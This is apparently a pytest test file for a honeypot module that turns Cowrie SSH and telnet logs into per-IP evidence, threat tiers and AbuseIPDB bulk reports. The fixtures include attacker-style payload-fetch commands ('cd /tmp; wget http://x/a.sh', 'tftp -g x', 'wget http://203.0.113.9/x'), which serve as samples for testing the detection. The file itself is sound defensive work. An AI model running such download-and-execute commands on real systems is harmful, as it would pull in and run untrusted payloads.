# honeypot/analysis/network/tests/test_report.py
import datetime as dt

import polars as pl

from honeypot.analysis.network.report import (
    CATEGORY_BRUTE_FORCE,
    CATEGORY_EXPLOITED_HOST,
    CATEGORY_HACKING,
    CATEGORY_IOT_TARGETED,
    CATEGORY_SSH,
    abuseipdb_bulk,
    ip_evidence,
    reportable_ips,
)

START = dt.datetime(2026, 9, 1, 12, 0, tzinfo=dt.timezone.utc)


def _event(
    src_ip: str,
    eventid: str,
    session: str | None = None,
    username: str | None = None,
    command_input: str | None = None,
    protocol: str = "ssh",
    minute: int = 0,
) -> dict:
    return {
        "src_ip": src_ip,
        "session": session or f"s-{src_ip}-{protocol}",
        "eventid": eventid,
        "node_role": "agent_detector",
        "protocol": protocol,
        "event_timestamp": START + dt.timedelta(minutes=minute),
        "username": username,
        "password": "x" if username else None,
        "command_input": command_input,
        "duration_ms": None,
    }


def _logins(src_ip: str, count: int, protocol: str = "ssh") -> list[dict]:
    return [
        _event(
            src_ip,
            "cowrie.login.failed",
            username=f"user{i}",
            protocol=protocol,
            minute=i,
        )
        for i in range(count)
    ]


def _events(rows: list[dict]) -> pl.DataFrame:
    # All-None columns would otherwise infer as pl.Null, not the String /
    # Int64 a real snapshot has.
    return pl.DataFrame(
        rows,
        infer_schema_length=None,
        schema_overrides={
            "username": pl.Utf8,
            "password": pl.Utf8,
            "command_input": pl.Utf8,
            "duration_ms": pl.Int64,
        },
    )


def _categories(result: pl.DataFrame, src_ip: str) -> set[int]:
    value = result.filter(pl.col("src_ip") == src_ip)["abuseipdb_categories"][0]
    return {int(c) for c in value.split(",")}


class TestIpEvidence:
    def test_counts_and_flags_per_ip(self) -> None:
        events = _events(
            _logins("1.1.1.1", 3)
            + _logins("1.1.1.1", 2, protocol="telnet")
            + [
                _event("1.1.1.1", "cowrie.login.success", username="root", minute=9),
                _event(
                    "1.1.1.1",
                    "cowrie.command.input",
                    command_input="cd /tmp; wget http://x/a.sh",
                    minute=10,
                ),
            ]
        )

        row = ip_evidence(events).row(0, named=True)

        assert row["login_attempts"] == 6  # 5 failed + 1 success
        assert row["distinct_usernames"] == 4  # user0..user2 overlap telnet's
        assert row["sessions"] == 2
        assert row["protocols"] == "ssh+telnet"
        assert row["authenticated"] is True
        assert row["ran_commands"] is True
        assert row["payload_download"] is True
        assert row["first_seen"] == START
        assert row["last_seen"] == START + dt.timedelta(minutes=10)

    def test_file_event_counts_as_payload_and_curl_is_case_insensitive(
        self,
    ) -> None:
        events = _events(
            [
                _event("1.1.1.1", "cowrie.session.file_download.failed"),
                _event("2.2.2.2", "cowrie.command.input", command_input="CURL -O x"),
                _event("3.3.3.3", "cowrie.command.input", command_input="uname -a"),
            ]
        )

        flags = dict(ip_evidence(events).select("src_ip", "payload_download").rows())

        assert flags == {"1.1.1.1": True, "2.2.2.2": True, "3.3.3.3": False}


class TestReportableIps:
    def test_tiers_and_threshold(self) -> None:
        events = _events(
            # Tier 1: exactly at the threshold.
            _logins("1.1.1.1", 10)
            # Below the threshold, nothing else -> not reportable.
            + _logins("2.2.2.2", 9)
            # Tier 2: two attempts, then commands.
            + _logins("3.3.3.3", 2)
            + [_event("3.3.3.3", "cowrie.command.input", command_input="uname")]
            # Tier 2 via a tunnel request alone.
            + [_event("4.4.4.4", "cowrie.direct-tcpip.request")]
            # Tier 3: payload download.
            + [_event("5.5.5.5", "cowrie.command.input", command_input="tftp -g x")]
        )

        result = reportable_ips(events, min_login_attempts=10)

        assert dict(result.select("src_ip", "tier").rows()) == {
            "5.5.5.5": 3,
            "3.3.3.3": 2,
            "4.4.4.4": 2,
            "1.1.1.1": 1,
        }
        # Sorted by tier, then attempts.
        assert result["src_ip"].to_list() == [
            "5.5.5.5",
            "3.3.3.3",
            "4.4.4.4",
            "1.1.1.1",
        ]

    def test_categories(self) -> None:
        events = _events(
            _logins("1.1.1.1", 10)
            + _logins("2.2.2.2", 10, protocol="telnet")
            + _logins("3.3.3.3", 2)
            + [_event("3.3.3.3", "cowrie.command.input", command_input="wget x")]
        )

        result = reportable_ips(events, min_login_attempts=10)

        assert _categories(result, "1.1.1.1") == {CATEGORY_BRUTE_FORCE, CATEGORY_SSH}
        assert _categories(result, "2.2.2.2") == {
            CATEGORY_BRUTE_FORCE,
            CATEGORY_IOT_TARGETED,
        }
        # Below the brute-force threshold: no category 18.
        assert _categories(result, "3.3.3.3") == {
            CATEGORY_SSH,
            CATEGORY_HACKING,
            CATEGORY_EXPLOITED_HOST,
        }

    def test_drops_non_global_and_excluded_ips(self) -> None:
        events = _events(
            _logins("10.0.0.5", 10)
            + _logins("127.0.0.1", 10)
            + _logins("8.8.4.4", 10)
            + _logins("9.9.9.9", 10)
        )

        result = reportable_ips(events, exclude_ips=["9.9.9.9"])

        assert result["src_ip"].to_list() == ["8.8.4.4"]

    def test_adds_enrichment_columns(self) -> None:
        enrichment = pl.DataFrame(
            {"src_ip": ["8.8.4.4"], "country": ["US"], "as_label": ["AS15169 G"]}
        )

        result = reportable_ips(_events(_logins("8.8.4.4", 10)), enrichment=enrichment)

        assert result.select("country", "as_label").row(0) == ("US", "AS15169 G")


class TestAbuseipdbBulk:
    def test_columns_and_comment(self) -> None:
        events = _events(
            _logins("8.8.4.4", 12)
            + [
                _event(
                    "8.8.4.4",
                    "cowrie.command.input",
                    command_input="wget http://203.0.113.9/x",
                    minute=30,
                )
            ]
        )

        bulk = abuseipdb_bulk(reportable_ips(events))

        assert bulk.columns == ["IP", "Categories", "ReportDate", "Comment"]
        row = bulk.row(0, named=True)
        assert row["IP"] == "8.8.4.4"
        assert row["Categories"] == "15,18,20,22"
        assert row["ReportDate"] == "2026-09-01T12:30:00Z"
        assert row["Comment"] == (
            "Honeypot: 12 SSH login attempts, ran shell commands, tried to "
            "download or upload a payload. Seen 2026-09-01 12:00 to "
            "2026-09-01 12:30 UTC."
        )
        # Never leaks command text (or the URL inside it).
        assert "203.0.113.9" not in row["Comment"]

    def test_empty_input(self) -> None:
        empty = reportable_ips(_events(_logins("8.8.4.4", 1)))

        assert abuseipdb_bulk(empty).height == 0
